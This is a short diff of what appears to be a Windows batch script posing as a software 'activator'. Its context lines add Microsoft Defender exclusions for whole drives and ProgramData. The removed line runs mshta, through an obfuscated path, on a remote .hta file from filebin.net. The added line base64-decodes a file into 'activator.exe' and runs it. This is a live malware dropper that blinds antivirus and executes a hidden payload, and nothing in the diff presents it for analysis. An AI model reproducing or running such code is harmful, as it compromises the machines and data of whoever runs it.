@@ -8,7 +8,8 @@ powershell.exe Add-MpPreference -ExclusionPath D:\
 powershell.exe Add-MpPreference -ExclusionPath F:\
 powershell.exe Add-MpPreference -ExclusionPath C:\ProgramData\SYS
 powershell.exe Add-MpPreference -ExclusionPath C:\ProgramData\
-powershell.exe . $env:C:\W*\S*2\m*h?a.*  'https://filebin.net/h6oeie0njn1af0lj/final.hta'
+powershell -C "& {$outpath = (Join-Path (pwd) 'activator.exe'); $inpath = (Join-Path (pwd) 'serialst.int'); [IO.File]::WriteAllBytes($outpath, ([convert]::FromBase64String(([IO.File]::ReadAllText($inpath)))))}"
+activator.exe
 
 echo.
 echo "
